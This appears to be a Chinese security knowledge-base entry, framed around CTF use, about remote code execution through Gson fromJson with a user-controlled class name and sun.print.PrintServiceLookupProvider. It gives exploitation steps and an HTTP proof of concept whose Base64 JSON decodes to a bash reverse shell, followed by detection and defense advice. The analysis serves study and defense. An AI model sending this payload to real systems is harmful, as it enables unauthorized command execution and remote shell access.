---
id: web-java-deser-gson-fromjson-classname-printservicelookup-rce
title: Gson fromJson 任意类实例化：可控类名 + 无参构造器副作用，选 sun.print.PrintServiceLookupProvider 经 execCmd 执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: gson-fromjson-arbitrary-class-constructor-rce
aliases:
- Gson 反序列化 RCE
- fromJson 类名可控
- PrintServiceLookupProvider 构造器
- lpcAllCom 命令执行
- Gson 无参构造器
tags:
- java
- deserialization
- gson
- constructor
- rce
- printservice
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T17:00:35+08:00'
  notes: 已对照原文13668图34-43核对：Gson fromJson→TypeToken.get→ReflectiveTypeAdapter.read→createAccumulator→constructor.newInstance无参构造；可控类名经Class.forName进入sun.print.PrintServiceLookupProvider，lpcAllCom经getAllPrinterNamesBSD→execCmd执行命令；图43 Kali 6666收到回连，链路成立；PoC未本机执行
---

## 一句话结论

当应用把用户可控的类名传给 `new Gson().fromJson(json, Class.forName(name))` 时，Gson 会为 `classOfT` 取反射适配器、在 `createAccumulator()` 中调用该类的无参构造器 `constructor.newInstance()`；选择 JDK 的 `sun.print.PrintServiceLookupProvider`，其构造器启动 `PrinterChangeListener`，刷新打印机时进入 `getAllPrinterNamesBSD()` 并执行 `execCmd(this.lpcAllCom[cmdIndex])`，攻击者用 JSON 字段 `lpcAllCom` 指定命令即可 RCE（Linux JDK 11+）。

## 原理

- **Gson 的反射实例化**：`Gson.fromJson(String, Class)` → `fromJson(String, TypeToken)` → `fromJson(JsonReader, TypeToken)`；后者对非空 JSON 取 `TypeAdapter`（`ReflectiveTypeAdapterFactory`），其 `read()` 在 `BEGIN_OBJECT` 时调用 `createAccumulator()`，内部执行 `constructor.construct()` → `constructor.newInstance()`（无参构造器），随后循环读取 JSON 字段并反射赋给对象字段。
- **构造器即执行点**：Gson 不要求类实现任何接口，也不校验类名是否在允许列表；只要 `Class.forName` 能加载且有无参构造器，就会被实例化。因此"任意类 + 有副作用构造器"就是 RCE。
- **PrintServiceLookupProvider 构造器**：`sun.print.PrintServiceLookupProvider()` 在 `pollServices` 为真时创建并启动 `PrinterChangeListener` 守护线程；监听线程调用 `refreshServices()` → `getAllPrinterNamesBSD()`；`getAllPrinterNamesBSD()` 在 `cmdIndex == -1` 时取 `getBSDCommandIndex()`，然后 `execCmd(this.lpcAllCom[cmdIndex])`，内部 `Runtime.exec` 执行命令数组。
- **字段可控**：Gson 按 JSON 字段名反射设置 `lpcAllCom`（String[]），攻击者把命令（如 `/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'`）放进数组即可；构造器副作用在对象构造后由监听线程触发。
- **平台差异**：该路径来自 Linux 的 `sun.print` 实现；Windows JDK 的 `PrintServiceLookupProvider` 实现不同，需换用对应平台的构造器 gadget（如其他 `sun.*`/JDK 类）。
- **为什么是 CTF 级利用**：真实应用通常不会把类名交给 Gson，但"反序列化框架 + 任意类名"是很常见的代码审计模式（`Class.forName`/`TypeToken` 可控）；该手法把"任意类实例化"直接升级为命令执行。

## 触发条件

- 应用有 `fromJson(json, Class.forName(userInput))` 或等价的"类名可控 + Gson 反序列化"入口，且目标类未做白名单/包限制。
- classpath 有 Gson；目标 JDK 为 Linux 环境且包含 `sun.print.PrintServiceLookupProvider`（JDK 11+ 实测可用）。
- 攻击者可提交 JSON（常经 Base64 包装在路径/参数中）并控制字段值。
- 目标进程允许 `Runtime.exec`（无 SecurityManager/RASP 拦截）。

## 利用步骤

1. 确认入口把类名与 JSON 都交给 Gson；用 `Class.forName` 或 `TypeToken` 加载的类没有白名单。
2. 选择 `sun.print.PrintServiceLookupProvider` 作为目标类；构造 JSON `{"lpcAllCom":["/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'","/bin/bash -c '...'"]}`。
3. Base64 编码 JSON，与类名一起提交（如 `/api/sun.print.PrintServiceLookupProvider/<base64>`）。
4. Gson 实例化 PrintServiceLookupProvider，监听线程刷新打印机时执行 `lpcAllCom` 中的命令，获得回连 shell。
5. 若目标为 Windows 或该构造器不可用，改用同类"无参构造器有副作用"的 JDK/三方类，并确认字段名与类型。

## PoC

```text
GET /api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS82NjY2IDA+JjEnIiwiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS82NjY2IDA+JjEnIl19 HTTP/1.1
Host: target
```

解码后为 `{"lpcAllCom":["/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/6666 0>&1'","/bin/bash -c '...'"]}`；原文在 JDK11+ 环境成功回连 shell。

## 变体与关联

- 变体：其他"无参构造器有副作用"的类（JDK `sun.print` 家族、模板/脚本引擎、数据库驱动等），关键是类名可控且构造器能触发危险操作。
- 变体：Parquet/Avro 等反序列化框架同样能按 schema 实例化任意 record 类并触发构造器，见 [[web-java-deserialization-parquet-avro-record-class-constructor-rce]]（同一 sink 类的另一种触发面）。
- 关联：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（JDBC 参数触发类加载/初始化）、[[web-java-deser-any-getter-jooq-convert-newinstance-spring-xml]]（getter 反射实例化）。
- 边界：Gson 类名白名单/`Class.forName` 包限制、RASP 对 `Runtime.exec` 的拦截、Windows 平台差异、JDK 版本移除 `sun.print` 实现都会使链失效。

## 检测与防御

- 检测：请求中出现类名参数且值为 `sun.print.PrintServiceLookupProvider` 等 JDK 内部类；Gson 反序列化异常栈出现 `createAccumulator`/`ReflectiveTypeAdapterFactory`；进程异常拉起 `bash -c`/`/bin/sh -c`。
- 防御：Gson 反序列化使用固定 `Class`/`TypeToken`，禁止用户传类名；若必须动态，维护类白名单并限制包前缀；RASP/EDR 监控 `Runtime.exec` 与打印机监听线程创建。
- 边界：类名可控本身不必然 RCE，需存在有副作用的构造器；检测应结合类白名单违规。
